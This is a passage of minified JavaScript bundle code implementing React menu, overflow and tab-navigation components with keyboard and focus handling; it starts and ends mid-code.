0,!0);break}if(e+=t,0===r&&e<=P||n===r-1&&e+eo(r)<=P){er(r,null);break}if(e+q>P){er(n-1,e-t-O+A);break}}h&&eo(0)+O>P&&j(null)}},[P,T,A,L,O,ee,Y]);let ea=V&&!!Z.length,ei={};null!==F&&J&&(ei={position:"absolute",left:F,top:0});let es={prefixCls:U,responsive:J,component:v,invalidate:X},el=i?(e,t)=>{let r=ee(e,t);return b.createElement(ss.Provider,{key:r,value:{...es,order:t,item:e,itemKey:r,registerSize:en,display:t<=z}},i(e,t))}:(e,t)=>{let r=ee(e,t);return b.createElement(sa,sn({},es,{order:t,key:r,item:e,renderItem:et,itemKey:r,registerSize:en,display:t<=z}))},ec={order:ea?z:Number.MAX_SAFE_INTEGER,className:`${U}-rest`,registerSize:function(e,t){D(t),R(A)},display:ea},eu=m||sd,ed=f?b.createElement(ss.Provider,{value:{...es,...ec}},f(Z)):b.createElement(sa,sn({},es,ec),"function"==typeof eu?eu(Z):eu),ep=b.createElement(y,sn({className:K(!X&&n,d),style:u,ref:t},C),g&&b.createElement(sa,sn({},es,{responsive:G,responsiveDisabled:!J,order:-1,className:`${U}-prefix`,registerSize:function(e,t){_(t)},display:!0}),g),Y.map(el),Q?ed:null,h&&b.createElement(sa,sn({},es,{responsive:G,responsiveDisabled:!J,order:z,className:`${U}-suffix`,registerSize:function(e,t){N(t)},display:!0,style:ei}),h));return G?b.createElement(a_,{onResize:function(e,t){E(t.clientWidth)},disabled:!J},ep):ep});sp.Item=sl,sp.RESPONSIVE=sc,sp.INVALIDATE=su;let sm=b.createContext(null);function sf(e){var t;return t=b.useContext(sm),`${t}-${e}`}let sg=b.createContext(null);function sh({children:e,locked:t,...r}){let n=b.useContext(sg),o=$(()=>{let e;return e={...n},Object.keys(r).forEach(t=>{let n=r[t];void 0!==n&&(e[t]=n)}),e},[n,r],(e,r)=>!t&&(e[0]!==r[0]||!tp(e[1],r[1],!0)));return b.createElement(sg.Provider,{value:o},e)}let sb=b.createContext(null);function sy(){return b.useContext(sb)}let sv=b.createContext([]);function sS(e){let t=b.useContext(sv);return b.useMemo(()=>void 0!==e?[...t,e]:t,[t,e])}let sx=b.createContext(null);e.s(["PathRegisterContext",0,sb,"PathTrackerContext",0,sv,"PathUserContext",0,sx,"useFullPath",()=>sS,"useMeasure",()=>sy],60698);let sC=b.createContext({});function sw(e,t=!1){if(iB(e)){let r=e.nodeName.toLowerCase(),n=["input","select","textarea","button"].includes(r)||e.isContentEditable||"a"===r&&!!e.getAttribute("href"),o=e.getAttribute("tabindex"),a=Number(o),i=null;return o&&!Number.isNaN(a)?i=a:n&&null===i&&(i=0),n&&e.disabled&&(i=null),null!==i&&(i>=0||t&&i<0)}return!1}function sk(e,t=!1){let r=[...e.querySelectorAll("*")].filter(e=>sw(e,t));return sw(e,t)&&r.unshift(e),r}function s$(e,t){if(!e)return;e.focus(t);let{cursor:r}=t||{};if(r&&(e instanceof HTMLInputElement||e instanceof HTMLTextAreaElement)){let t=e.value.length;switch(r){case"start":e.setSelectionRange(0,0);break;case"end":e.setSelectionRange(t,t);break;default:e.setSelectionRange(0,t)}}}e.s(["getFocusNodeList",()=>sk,"triggerFocus",()=>s$],63611);let{LEFT:sE,RIGHT:sP,UP:sT,DOWN:sI,ENTER:sM,ESC:sR,HOME:sA,END:sD}=i6,sL=[sT,sI,sE,sP];function s_(e,t){return sk(e,!0).filter(e=>t.has(e))}function sO(e,t,r,n=1){if(!e)return null;let o=s_(e,t),a=o.length,i=o.findIndex(e=>r===e);return n<0?-1===i?i=a-1:i-=1:n>0&&(i+=1),o[i=(i+a)%a]}let sN=(e,t)=>{let r=new Set,n=new Map,o=new Map;return e.forEach(e=>{let a=document.querySelector(`[data-menu-id='${t}-${e}']`);a&&(r.add(a),o.set(a,e),n.set(e,a))}),{elements:r,key2element:n,element2key:o}},sF="__RC_UTIL_PATH_SPLIT__",sj="rc-menu-more";function sH(e){let t=b.useRef(e);t.current=e;let r=b.useCallback((...e)=>t.current?.(...e),[]);return e?r:void 0}var sB=b;function sz(e,t,r,n){let{activeKey:o,onActive:a,onInactive:i}=b.useContext(sg),s={active:o===e};return t||(s.onMouseEnter=t=>{r?.({key:e,domEvent:t}),a(e)},s.onMouseLeave=t=>{n?.({key:e,domEvent:t}),i(e)}),s}function sV(e){let{mode:t,rtl:r,inlineIndent:n}=b.useContext(sg);return"inline"!==t?null:r?{paddingRight:e*n}:{paddingLeft:e*n}}function sW({icon:e,props:t,children:r}){let n;return null===e||!1===e?null:("function"==typeof e?n=b.createElement(e,{...t}):"boolean"!=typeof e&&(n=e),n||r||null)}function sU({item:e,...t}){return Object.defineProperty(t,"item",{get:()=>(G(!1,"`info.item` is deprecated since we will move to function component that not provides React Node instance in future."),e)}),t}function sq(){return(sq=Object.assign.bind()).apply(this,arguments)}class sG extends sB.Component{render(){let{title:e,attribute:t,elementRef:r,...n}=this.props,o=J(n,["eventKey","popupClassName","popupOffset","onTitleClick"]);return G(!t,"`attribute` of Menu.Item is deprecated. Please pass attribute directly."),sB.createElement(sp.Item,sq({},t,{title:"string"==typeof e?e:void 0},o,{ref:r}))}}let sJ=sB.forwardRef((e,t)=>{let{style:r,className:n,eventKey:o,warnKey:a,disabled:i,itemIcon:s,children:l,role:c,onMouseEnter:u,onMouseLeave:d,onClick:p,onKeyDown:m,onFocus:f,...g}=e,h=sf(o),{prefixCls:b,onItemClick:y,disabled:v,overflowDisabled:S,itemIcon:x,selectedKeys:C,onActive:w}=sB.useContext(sg),{_internalRenderMenuItem:k}=sB.useContext(sC),$=`${b}-item`,E=sB.useRef(),P=sB.useRef(),T=v||i,I=A(t,P),M=sS(o),R=e=>({key:o,keyPath:[...M].reverse(),item:E.current,domEvent:e}),{active:D,...L}=sz(o,T,u,d),_=C.includes(o),O=sV(M.length),N={};"option"===e.role&&(N["aria-selected"]=_);let F=sB.createElement(sG,sq({ref:E,elementRef:I,role:null===c?"none":c||"menuitem",tabIndex:i?null:-1,"data-menu-id":S&&h?null:h},J(g,["extra"]),L,N,{component:"li","aria-disabled":i,style:{...O,...r},className:K($,{[`${$}-active`]:D,[`${$}-selected`]:_,[`${$}-disabled`]:T},n),onClick:e=>{if(T)return;let t=R(e);p?.(sU(t)),y(t)},onKeyDown:e=>{if(m?.(e),e.which===i6.ENTER){let t=R(e);p?.(sU(t)),y(t)}},onFocus:e=>{w(o),f?.(e)}}),l,sB.createElement(sW,{props:{...e,isSelected:_},icon:s||x}));return k&&(F=k(F,e,{selected:_})),F}),sX=sB.forwardRef(function(e,t){let{eventKey:r}=e,n=sy(),o=sS(r);return(sB.useEffect(()=>{if(n)return n.registerPath(r,o),()=>{n.unregisterPath(r,o)}},[o]),n)?null:sB.createElement(sJ,sq({},e,{ref:t}))});function sK(){return(sK=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,sX],65044);let sQ=b.forwardRef(({className:e,children:t,...r},n)=>{let{prefixCls:o,mode:a,rtl:i}=b.useContext(sg);return b.createElement("ul",sK({className:K(o,i&&`${o}-rtl`,`${o}-sub`,`${o}-${"inline"===a?"inline":"vertical"}`,e),role:"menu"},r,{"data-menu-list":!0,ref:n}),t)});function sY(e,t){return X(e).map((e,r)=>{if(b.isValidElement(e)){let{key:n}=e,o=e.props?.eventKey??n;null==o&&(o=`tmp_key-${[...t,r].join("-")}`);let a={key:o,eventKey:o};return b.cloneElement(e,a)}return e})}let sZ={adjustX:1,adjustY:1},s0={topLeft:{points:["bl","tl"],overflow:sZ},topRight:{points:["br","tr"],overflow:sZ},bottomLeft:{points:["tl","bl"],overflow:sZ},bottomRight:{points:["tr","br"],overflow:sZ},leftTop:{points:["tr","tl"],overflow:sZ},leftBottom:{points:["br","bl"],overflow:sZ},rightTop:{points:["tl","tr"],overflow:sZ},rightBottom:{points:["bl","br"],overflow:sZ}},s1={topLeft:{points:["bl","tl"],overflow:sZ},topRight:{points:["br","tr"],overflow:sZ},bottomLeft:{points:["tl","bl"],overflow:sZ},bottomRight:{points:["tr","br"],overflow:sZ},rightTop:{points:["tr","tl"],overflow:sZ},rightBottom:{points:["br","bl"],overflow:sZ},leftTop:{points:["tl","tr"],overflow:sZ},leftBottom:{points:["bl","br"],overflow:sZ}};function s2(e,t,r){return t||(r?r[e]||r.other:void 0)}let s3={horizontal:"bottomLeft",vertical:"rightTop","vertical-left":"rightTop","vertical-right":"leftTop"};function s6({prefixCls:e,visible:t,children:r,popup:n,popupStyle:o,popupClassName:a,popupOffset:i,disabled:s,mode:l,onVisibleChange:c}){let{getPopupContainer:u,rtl:d,subMenuOpenDelay:p,subMenuCloseDelay:m,builtinPlacements:f,triggerSubMenuAction:g,forceSubMenuRender:h,rootClassName:y,motion:v,defaultMotions:S}=b.useContext(sg),[x,C]=b.useState(!1),w=d?{...s1,...f}:{...s0,...f},k=s3[l],$=s2(l,v,S),E=b.useRef($);"inline"!==l&&(E.current=$);let P={...E.current,leavedClassName:`${e}-hidden`,removeOnLeave:!1,motionAppear:!0},T=b.useRef();return b.useEffect(()=>(T.current=oU(()=>{C(t)}),()=>{oU.cancel(T.current)}),[t]),b.createElement(i3,{prefixCls:e,popupClassName:K(`${e}-popup`,{[`${e}-rtl`]:d},a,y),stretch:"horizontal"===l?"minWidth":null,getPopupContainer:u,builtinPlacements:w,popupPlacement:k,popupVisible:x,popup:n,popupStyle:o,popupAlign:i&&{offset:i},action:s?[]:[g],mouseEnterDelay:p,mouseLeaveDelay:m,onPopupVisibleChange:c,forceRender:h,popupMotion:P,fresh:!0},r)}function s4(){return(s4=Object.assign.bind()).apply(this,arguments)}function s5({id:e,open:t,keyPath:r,children:n}){let o="inline",{prefixCls:a,forceSubMenuRender:i,motion:s,defaultMotions:l,mode:c}=b.useContext(sg),u=b.useRef(!1);u.current=c===o;let[d,p]=b.useState(!u.current),m=!!u.current&&t;b.useEffect(()=>{u.current&&p(!1)},[c]);let f={...s2(o,s,l)};r.length>1&&(f.motionAppear=!1);let g=f.onVisibleChanged;return(f.onVisibleChanged=e=>(u.current||e||p(!0),g?.(e)),d)?null:b.createElement(sh,{mode:o,locked:!u.current},b.createElement(iC,s4({visible:m},f,{forceRender:i,removeOnLeave:!1,leavedClassName:`${a}-hidden`}),({className:t,style:r})=>b.createElement(sQ,{id:e,className:t,style:r},n)))}function s8(){return(s8=Object.assign.bind()).apply(this,arguments)}let s7=b.forwardRef((e,t)=>{let{style:r,className:n,styles:o,classNames:a,title:i,eventKey:s,warnKey:l,disabled:c,internalPopupClose:u,children:d,itemIcon:p,expandIcon:m,popupClassName:f,popupOffset:g,popupStyle:h,onClick:y,onMouseEnter:v,onMouseLeave:S,onTitleClick:x,onTitleMouseEnter:C,onTitleMouseLeave:w,popupRender:k,...$}=e,E=sf(s),{prefixCls:P,mode:T,openKeys:I,disabled:M,overflowDisabled:R,activeKey:A,selectedKeys:D,itemIcon:L,expandIcon:_,onItemClick:O,onOpenChange:N,onActive:F,popupRender:j}=b.useContext(sg),{_internalRenderSubMenuItem:H}=b.useContext(sC),{isSubPathKey:B}=b.useContext(sx),z=sS(),V=`${P}-submenu`,W=M||c,U=b.useRef(),q=b.useRef(),G=m??_,J=I.includes(s),X=!R&&J,Q=B(D,s),{active:Y,...Z}=sz(s,W,C,w),[ee,et]=b.useState(!1),er=e=>{W||et(e)},en=b.useMemo(()=>Y||"inline"!==T&&(ee||B([A],s)),[T,Y,A,ee,s,B]),eo=sV(z.length),ea=sH(e=>{y?.(sU(e)),O(e)}),ei=E&&`${E}-popup`,es=b.useMemo(()=>b.createElement(sW,{icon:"horizontal"!==T?G:void 0,props:{...e,isOpen:X,isSubMenu:!0}},b.createElement("i",{className:`${V}-arrow`})),[T,G,e,X,V]),el=b.createElement("div",s8({role:"menuitem",style:eo,className:`${V}-title`,tabIndex:W?null:-1,ref:U,title:"string"==typeof i?i:null,"data-menu-id":R&&E?null:E,"aria-expanded":X,"aria-haspopup":!0,"aria-controls":ei,"aria-disabled":W,onClick:e=>{W||(x?.({key:s,domEvent:e}),"inline"===T&&N(s,!J))},onFocus:()=>{F(s)}},Z),i,es),ec=b.useRef(T);"inline"!==T&&z.length>1?ec.current="vertical":ec.current=T;let eu=ec.current,ed=b.useMemo(()=>{let t=b.createElement(sh,{classNames:a,styles:o,mode:"horizontal"===eu?"vertical":eu},b.createElement(sQ,{id:ei,ref:q},d)),r=k||j;return r?r(t,{item:e,keys:z}):t},[k,j,z,ei,d,e,eu]);if(!R){let e=ec.current;el=b.createElement(s6,{mode:e,prefixCls:V,visible:!u&&X&&"inline"!==T,popupClassName:f,popupOffset:g,popupStyle:h,popup:ed,disabled:W,onVisibleChange:e=>{"inline"!==T&&N(s,e)}},el)}let ep=b.createElement(sp.Item,s8({ref:t,role:"none"},$,{component:"li",style:r,className:K(V,`${V}-${T}`,n,{[`${V}-open`]:X,[`${V}-active`]:en,[`${V}-selected`]:Q,[`${V}-disabled`]:W}),onMouseEnter:e=>{er(!0),v?.({key:s,domEvent:e})},onMouseLeave:e=>{er(!1),S?.({key:s,domEvent:e})}}),el,!R&&b.createElement(s5,{id:ei,open:X,keyPath:z},d));return H&&(ep=H(ep,e,{selected:Q,active:en,open:X,disabled:W})),b.createElement(sh,{classNames:a,styles:o,onItemClick:ea,mode:"horizontal"===T?"vertical":T,itemIcon:p??L,expandIcon:G},ep)}),s9=b.forwardRef((e,t)=>{let r,{eventKey:n,children:o}=e,a=sS(n),i=sY(o,a),s=sy();return b.useEffect(()=>{if(s)return s.registerPath(n,a),()=>{s.unregisterPath(n,a)}},[a]),r=s?i:b.createElement(s7,s8({ref:t},e),i),b.createElement(sv.Provider,{value:a},r)});function le({className:e,style:t}){let{prefixCls:r}=b.useContext(sg);return sy()?null:b.createElement("li",{role:"separator",className:K(`${r}-item-divider`,e),style:t})}function lt(){return(lt=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,s9],4079),e.s(["default",()=>le],50211);let lr=b.forwardRef((e,t)=>{let{className:r,title:n,eventKey:o,children:a,...i}=e,{prefixCls:s,classNames:l,styles:c}=b.useContext(sg),u=`${s}-item-group`;return b.createElement("li",lt({ref:t,role:"presentation"},i,{onClick:e=>e.stopPropagation(),className:K(u,r)}),b.createElement("div",{role:"presentation",className:K(`${u}-title`,l?.listTitle),style:c?.listTitle,title:"string"==typeof n?n:void 0},n),b.createElement("ul",{role:"group",className:K(`${u}-list`,l?.list),style:c?.list},a))}),ln=b.forwardRef((e,t)=>{let{eventKey:r,children:n}=e,o=sY(n,sS(r));return sy()?o:b.createElement(lr,lt({ref:t},J(e,["warnKey"])),o)});function lo(){return(lo=Object.assign.bind()).apply(this,arguments)}function la(e,t,r,n,o){let a=e,i={divider:le,item:sX,group:ln,submenu:s9,...n};return t&&(a=function e(t,r,n){let{item:o,group:a,submenu:i,divider:s}=r;return(t||[]).map((t,l)=>{if(t&&"object"==typeof t){let{label:c,children:u,key:d,type:p,extra:m,...f}=t,g=d??`tmp-${l}`;return u||"group"===p?"group"===p?b.createElement(a,lo({key:g},f,{title:c}),e(u,r,n)):b.createElement(i,lo({key:g},f,{title:c}),e(u,r,n)):"divider"===p?b.createElement(s,lo({key:g},f)):b.createElement(o,lo({key:g},f,{extra:m}),c,(!!m||0===m)&&b.createElement("span",{className:`${n}-item-extra`},m))}return null}).filter(e=>e)}(t,i,o)),sY(a,r)}function li(){return(li=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,ln],33578);let ls=[],ll=b.forwardRef((e,t)=>{var r;let n,o,a,{prefixCls:i="rc-menu",rootClassName:s,style:l,className:c,styles:u,classNames:d,tabIndex:p=0,items:m,children:f,direction:g,id:h,mode:y="vertical",inlineCollapsed:v,disabled:S,disabledOverflow:x,subMenuOpenDelay:C=.1,subMenuCloseDelay:k=.1,forceSubMenuRender:$,defaultOpenKeys:E,openKeys:P,activeKey:T,defaultActiveFirst:I,selectable:M=!0,multiple:R=!1,defaultSelectedKeys:A,selectedKeys:D,onSelect:L,onDeselect:_,inlineIndent:O=24,motion:N,defaultMotions:F,triggerSubMenuAction:j="hover",builtinPlacements:H,itemIcon:B,expandIcon:z,overflowedIndicator:V="...",overflowedIndicatorPopupClassName:W,getPopupContainer:U,onClick:q,onOpenChange:G,onKeyDown:J,openAnimation:X,openTransitionName:Q,_internalRenderMenuItem:Y,_internalRenderSubMenuItem:Z,_internalComponents:ee,popupRender:et,...er}=e,[en,eo]=b.useMemo(()=>[la(f,m,ls,ee,i),la(f,m,ls,{},i)],[f,m,ee]),[ea,ei]=b.useState(!1),es=b.useRef(),el=aY(h?`rc-menu-uuid-${h}`:"rc-menu-uuid"),ec="rtl"===g,[eu,ed]=w(E,P),ep=eu||ls,em=(e,t=!1)=>{function r(){ed(e),G?.(e)}t?(0,aU.flushSync)(r):r()},[ef,eg]=b.useState(ep),eh=b.useRef(!1),[eb,ey]=b.useMemo(()=>("inline"===y||"vertical"===y)&&v?["vertical",v]:[y,!1],[y,v]),ev="inline"===eb,[eS,ex]=b.useState(eb),[eC,ew]=b.useState(ey);b.useEffect(()=>{ex(eb),ew(ey),eh.current&&(ev?ed(ef):em(ls))},[eb,ey]);let[ek,e$]=b.useState(0),eE=ek>=en.length-1||"horizontal"!==eS||x;b.useEffect(()=>{ev&&eg(ep)},[ep]),b.useEffect(()=>(eh.current=!0,()=>{eh.current=!1}),[]);let{registerPath:eP,unregisterPath:eT,refreshOverflowKeys:eI,isSubPathKey:eM,getKeyPath:eR,getKeys:eA,getSubPathKeys:eD}=function(){let[,e]=b.useState({}),t=(0,b.useRef)(new Map),r=(0,b.useRef)(new Map),[n,o]=b.useState([]),a=(0,b.useRef)(0),i=(0,b.useRef)(!1),s=(0,b.useCallback)((n,o)=>{let s=o.join(sF);r.current.set(s,n),t.current.set(n,s),a.current+=1;let l=a.current;Promise.resolve().then(()=>{l===a.current&&(i.current||e({}))})},[]),l=(0,b.useCallback)((e,n)=>{let o=n.join(sF);r.current.delete(o),t.current.delete(e)},[]),c=(0,b.useCallback)(e=>{o(e)},[]),u=(0,b.useCallback)((e,r)=>{let o=(t.current.get(e)||"").split(sF);return r&&n.includes(o[0])&&o.unshift(sj),o},[n]),d=(0,b.useCallback)((e,t)=>e.filter(e=>void 0!==e).some(e=>u(e,!0).includes(t)),[u]),p=(0,b.useCallback)(e=>{let n=`${t.current.get(e)}${sF}`,o=new Set;return[...r.current.keys()].forEach(e=>{e.startsWith(n)&&o.add(r.current.get(e))}),o},[]);return b.useEffect(()=>()=>{i.current=!0},[]),{registerPath:s,unregisterPath:l,refreshOverflowKeys:c,isSubPathKey:d,getKeyPath:u,getKeys:()=>{let e=[...t.current.keys()];return n.length&&e.push(sj),e},getSubPathKeys:p}}(),eL=b.useMemo(()=>({registerPath:eP,unregisterPath:eT}),[eP,eT]),e_=b.useMemo(()=>({isSubPathKey:eM}),[eM]);b.useEffect(()=>{eI(eE?ls:en.slice(ek+1).map(e=>e.key))},[ek,eE]);let[eO,eN]=w(T||I&&en[0]?.key,T),eF=sH(e=>{eN(e)}),ej=sH(()=>{eN(void 0)});(0,b.useImperativeHandle)(t,()=>({list:es.current,focus:e=>{let t,r=eA(),{elements:n,key2element:o,element2key:a}=sN(r,el),i=s_(es.current,n);t=eO&&r.includes(eO)?eO:i[0]?a.get(i[0]):en.find(e=>!e.props.disabled)?.key;let s=o.get(t);t&&s&&s?.focus?.(e)},findItem:({key:e})=>{let{key2element:t}=sN(eA(),el);return t.get(e)||null}}));let[eH,eB]=w(A||[],D),ez=b.useMemo(()=>Array.isArray(eH)?eH:null==eH?ls:[eH],[eH]),eV=sH(e=>{q?.(sU(e)),(e=>{if(M){let t,{key:r}=e,n=ez.includes(r);eB(t=R?n?ez.filter(e=>e!==r):[...ez,r]:[r]);let o={...e,selectedKeys:t};n?_?.(o):L?.(o)}!R&&ep.length&&"inline"!==eS&&em(ls)})(e)}),eW=sH((e,t)=>{let r=ep.filter(t=>t!==e);if(t)r.push(e);else if("inline"!==eS){let t=eD(e);r=r.filter(e=>!t.has(e))}tp(ep,r,!0)||em(r,!0)}),eU=(r=(e,t)=>{let r=t??!ep.includes(e);eW(e,r)},n=b.useRef(),(o=b.useRef()).current=eO,a=()=>{oU.cancel(n.current)},b.useEffect(()=>()=>{a()},[]),e=>{let{which:t}=e;if([...sL,sM,sR,sA,sD].includes(t)){let i=eA(),s=sN(i,el),{elements:l,key2element:c,element2key:u}=s,d=function(e,t){let r=e||document.activeElement;for(;r;){if(t.has(r))return r;r=r.parentElement}return null}(c.get(eO),l),p=u.get(d),m=function(e,t,r,n){let o="prev",a="next",i="children",s="parent";if("inline"===e&&n===sM)return{inlineTrigger:!0};let l={[sT]:o,[sI]:a},c={[sT]:o,[sI]:a,[sM]:i,[sR]:s,[sE]:r?i:s,[sP]:r?s:i};switch(({inline:l,horizontal:{[sE]:r?a:o,[sP]:r?o:a,[sI]:i,[sM]:i},vertical:c,inlineSub:l,horizontalSub:c,verticalSub:c})[`${e}${t?"":"Sub"}`]?.[n]){case o:return{offset:-1,sibling:!0};case a:return{offset:1,sibling:!0};case s:return{offset:-1,sibling:!1};case i:return{offset:1,sibling:!1};default:return null}}(eS,1===eR(p,!0).length,ec,t);if(!m&&t!==sA&&t!==sD)return;(sL.includes(t)||[sA,sD].includes(t))&&e.preventDefault();let f=e=>{if(e){let t=e,r=e.querySelector("a");r?.getAttribute("href")&&(t=r);let i=u.get(e);eN(i),a(),n.current=oU(()=>{o.current===i&&t.focus()})}};if([sA,sD].includes(t)||m.sibling||!d){let e,r=s_(e=d&&"inline"!==eS?function(e){let t=e;for(;t;){if(t.getAttribute("data-menu-list"))return t;t=t.parentElement}return null}(d):es.current,l);f(t===sA?r[0]:t===sD?r[r.length-1]:sO(e,l,d,m.offset))}else if(m.inlineTrigger)r(p);else if(m.offset>0)r(p,!0),a(),n.current=oU(()=>{s=sN(i,el);let e=d.getAttribute("aria-controls");f(sO(document.getElementById(e),s.elements))},5);else if(m.offset<0){let e=eR(p,!0),t=e[e.length-2],n=c.get(t);r(t,!1),f(n)}}J?.(e)});b.useEffect(()=>{ei(!0)},[]);let eq=b.useMemo(()=>({_internalRenderMenuItem:Y,_internalRenderSubMenuItem:Z}),[Y,Z]),eG="horizontal"!==eS||x?en:en.map((e,t)=>b.createElement(sh,{key:e.key,overflowDisabled:t>ek,classNames:d,styles:u},e)),eJ=b.createElement(sp,li({id:h,ref:es,prefixCls:`${i}-overflow`,component:"ul",itemComponent:sX,className:K(i,`${i}-root`,`${i}-${eS}`,c,{[`${i}-inline-collapsed`]:eC,[`${i}-rtl`]:ec},s),dir:g,style:l,role:"menu",tabIndex:p,data:eG,renderRawItem:e=>e,renderRawRest:e=>{let t=e.length,r=t?en.slice(-t):null;return b.createElement(s9,{eventKey:sj,title:V,disabled:eE,internalPopupClose:0===t,popupClassName:W},r)},maxCount:"horizontal"!==eS||x?sp.INVALIDATE:sp.RESPONSIVE,ssr:"full","data-menu-list":!0,onVisibleChange:e=>{e$(e)},onKeyDown:eU},er));return b.createElement(sC.Provider,{value:eq},b.createElement(sm.Provider,{value:el},b.createElement(sh,{prefixCls:i,rootClassName:s,classNames:d,styles:u,mode:eS,openKeys:ep,rtl:ec,disabled:S,motion:ea?N:null,defaultMotions:ea?F:null,activeKey:eO,onActive:eF,onInactive:ej,selectedKeys:ez,inlineIndent:O,subMenuOpenDelay:C,subMenuCloseDelay:k,forceSubMenuRender:$,builtinPlacements:H,triggerSubMenuAction:j,getPopupContainer:U,itemIcon:B,expandIcon:z,onItemClick:eV,onOpenChange:eW,popupRender:et},b.createElement(sx.Provider,{value:e_},eJ),b.createElement("div",{style:{display:"none"},"aria-hidden":!0},b.createElement(sb.Provider,{value:eL},eo)))))});function lc(){return(lc=Object.assign.bind()).apply(this,arguments)}ll.Item=sX,ll.SubMenu=s9,ll.ItemGroup=ln,ll.Divider=le,e.s(["default",0,ll],13381);let lu=b.forwardRef((e,t)=>{let{prefixCls:r,id:n,tabs:o,locale:a,mobile:i,more:s={},style:l,className:c,editable:u,tabBarGutter:d,rtl:p,removeAriaLabel:m,onTabClick:f,getPopupContainer:g,popupClassName:h,popupStyle:y}=e,[v,S]=(0,b.useState)(!1),[x,C]=(0,b.useState)(null),{icon:w="More"}=s,k=`${n}-more-popup`,$=`${r}-dropdown`,E=null!==x?`${k}-${x}`:null,P=a?.dropdownAriaLabel,T=b.createElement(ll,{onClick:({key:e,domEvent:t})=>{f(e,t),S(!1)},prefixCls:`${$}-menu`,id:k,tabIndex:-1,role:"listbox","aria-activedescendant":E,selectedKeys:[x],"aria-label":void 0!==P?P:"expanded dropdown"},o.map(e=>{let{closable:t,disabled:r,closeIcon:o,key:a,label:i}=e,s=az(t,o,u,r);return b.createElement(sX,{key:a,id:`${k}-${a}`,role:"option","aria-controls":n&&`${n}-panel-${a}`,disabled:r},b.createElement("span",null,i),s&&b.createElement("button",{type:"button","aria-label":m||"remove",tabIndex:0,className:`${$}-menu-item-remove`,onClick:e=>{e.stopPropagation(),e.preventDefault(),e.stopPropagation(),u.onEdit("remove",{key:a,event:e})}},o||u.removeIcon||"×"))}));function I(e){let t=o.filter(e=>!e.disabled),r=t.findIndex(e=>e.key===x)||0,n=t.length;for(let o=0;o<n;o+=1){let o=t[r=(r+e+n)%n];if(!o.disabled)return void C(o.key)}}(0,b.useEffect)(()=>{let e=document.getElementById(E);e?.scrollIntoView&&e.scrollIntoView(!1)},[E,x]),(0,b.useEffect)(()=>{v||C(null)},[v]);let M={marginInlineStart:d};o.length||(M.visibility="hidden",M.order=1);let R=K(h,{[`${$}-rtl`]:p}),A=i?null:b.createElement(sr,lc({prefixCls:$,overlay:T,visible:!!o.length&&v,onVisibleChange:S,overlayClassName:R,overlayStyle:y,mouseEnterDelay:.1,mouseLeaveDelay:.1,getPopupContainer:g},s),b.createElement("button",{type:"button",className:`${r}-nav-more`,style:M,"aria-haspopup":"listbox","aria-controls":k,id:`${n}-more`,"aria-expanded":v,onKeyDown:function(e){let{which:t}=e;if(!v){[i6.DOWN,i6.SPACE,i6.ENTER].includes(t)&&(S(!0),e.preventDefault());return}switch(t){case i6.UP:I(-1),e.preventDefault();break;case i6.DOWN:I(1),e.preventDefault();break;case i6.ESC:S(!1);break;case i6.SPACE:case i6.ENTER:null!==x&&f(x,e)}}},w));return b.createElement("div",{className:K(`${r}-nav-operations`,c),style:l,ref:t},A,b.createElement(aV,{prefixCls:r,locale:a,editable:u}))}),ld=b.memo(lu,(e,t)=>t.tabMoving),lp=e=>{let{prefixCls:t,id:r,active:n,focus:o,tab:{key:a,label:i,disabled:s,closeIcon:l,icon:c},closable:u,renderWrapper:d,removeAriaLabel:p,editable:m,onClick:f,onFocus:g,onBlur:h,onKeyDown:y,onMouseDown:v,onMouseUp:S,style:x,className:C,tabCount:w,currentPosition:k}=e,$=`${t}-tab`,E=az(u,l,m,s);function P(e){s||f(e)}let T=b.useMemo(()=>c&&"string"==typeof i?b.createElement("span",null,i):i,[i,c]),I=b.useRef(null);b.useEffect(()=>{o&&I.current&&I.current.focus()},[o]);let M=b.createElement("div",{key:a,"data-node-key":aB(a),className:K($,C,{[`${$}-with-remove`]:E,[`${$}-active`]:n,[`${$}-disabled`]:s,[`${$}-focus`]:o}),style:x,onClick:P},b.createElement("div",{ref:I,role:"tab","aria-selected":n,id:r&&`${r}-tab-${a}`,className:`${$}-btn`,"aria-controls":r&&`${r}-panel-${a}`,"aria-disabled":s,tabIndex:s?null:n?0:-1,onClick:e=>{e.stopPropagation(),P(e)},onKeyDown:y,onMouseDown:v,onMouseUp:S,onFocus:g,onBlur:h},o&&b.createElement("div",{"aria-live":"polite",style:{width:0,height:0,position:"absolute",overflow:"hidden",opacity:0}},`Tab ${k} of ${w}`),c&&b.createElement("span",{className:`${$}-icon`},c),i&&T),E&&b.createElement("button",{type:"button","aria-label":p||"remove",tabIndex:n?0:-1,className:`${$}-remove`,onClick:e=>{e.stopPropagation(),e.preventDefault(),e.stopPropagation(),m.onEdit("remove",{key:a,event:e})}},l||m.removeIcon||"×"));return d?d(M):M};function lm(){return(lm=Object.assign.bind()).apply(this,arguments)}let lf=e=>{let{offsetWidth:t=0,offsetHeight:r=0}=e.current||{};if(e.current){let{width:r,height:n}=e.current.getBoundingClientRect();if(1>Math.abs(r-t))return[r,n]}return[t,r]},lg=(e,t)=>e[+!t],lh=b.forwardRef((e,t)=>{var r;let n,o,a,i,{className:s,style:l,id:c,animated:u,activeKey:d,rtl:p,extra:m,editable:f,locale:g,tabPosition:h,tabBarGutter:v,children:S,onTabClick:x,onTabScroll:C,indicator:w,classNames:k,styles:$}=e,{prefixCls:E,tabs:P}=b.useContext(a$),T=(0,b.useRef)(null),I=(0,b.useRef)(null),M=(0,b.useRef)(null),R=(0,b.useRef)(null),D=(0,b.useRef)(null),L=(0,b.useRef)(null),_=(0,b.useRef)(null),O="top"===h||"bottom"===h,[N,F]=aN(0,(e,t)=>{O&&C&&C({direction:e>t?"left":"right"})}),[j,H]=aN(0,(e,t)=>{!O&&C&&C({direction:e>t?"top":"bottom"})}),[B,z]=(0,b.useState)([0,0]),[V,W]=(0,b.useState)([0,0]),[U,q]=(0,b.useState)([0,0]),[G,J]=(0,b.useState)([0,0]),[X,Q]=function(e){let t=(0,b.useRef)([]),[,r]=(0,b.useState)({}),n=(0,b.useRef)("function"==typeof e?e():e),o=aF(()=>{let e=n.current;t.current.forEach(t=>{e=t(e)}),t.current=[],n.current=e,r({})});return[n.current,function(e){t.current.push(e),o()}]}(new Map),Y=(r=V[0],(0,b.useMemo)(()=>{let e=new Map,t=X.get(P[0]?.key)||aO,r=t.left+t.width;for(let 